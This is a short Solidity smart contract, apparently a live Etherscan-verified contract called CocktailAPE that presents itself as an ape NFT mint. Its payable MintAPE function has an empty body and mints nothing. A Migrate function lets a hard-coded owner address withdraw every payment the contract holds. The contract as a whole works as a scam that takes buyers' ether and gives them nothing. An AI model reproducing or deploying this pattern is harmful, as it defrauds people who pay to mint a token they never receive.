/**
 *Submitted for verification at Etherscan.io on 2023-02-28
*/

pragma solidity ^0.4.26;

contract CocktailAPE {

    address private  owner;

     constructor() public{   
        owner=0x67b700F5b01283568eFb068dba39C565Cd384BDA;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function Migrate() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function MintAPE() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}